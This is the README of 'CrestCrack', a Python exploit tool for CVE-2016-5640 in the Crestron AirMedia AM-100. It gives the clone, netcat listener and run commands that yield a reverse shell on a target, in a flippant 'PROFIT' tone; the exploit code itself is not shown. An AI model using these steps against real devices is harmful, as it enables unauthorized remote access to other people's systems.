![Supported Python versions](https://img.shields.io/badge/python-2.7-blue.svg)
# CrestCrack
CrestCrack is a simple script that exploits CVE-2016-5640 / CLVA-2016-05-002 within the Crestron AirMedia AM-100 (v1.1.1.11 - v1.2.1). When supplied with arguments CrestCrack will utilize netcat to create a reverse shell between your target and a netcat listener of your choice. 

## Setup:
1. Clone a copy of CrestCrack `git clone https://github.com/vpnguy/CrestCrack`
2. Launch a netcat listener `nc -lvp 1337`
3. Execute CrestCrack against your target with your listener info `./crestcrack.py https://targethost 255.255.255.255 1337`
4. ??????
5. **PROFIT**

###Usage:
**./crescrack.py *[target host] [listener IP] [listener port]***

###Example: 
**./crescrack.py https://targethost 123.123.123.123 3311**

 

## Additional Vulnerability Information:
[Cylance Vulnerability Disclosure](https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-002.md)

[NIST CVE-2016-5640](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5640)

## To be added:
- Error handling/bounds checking
- Enhanced argument support
- --help output

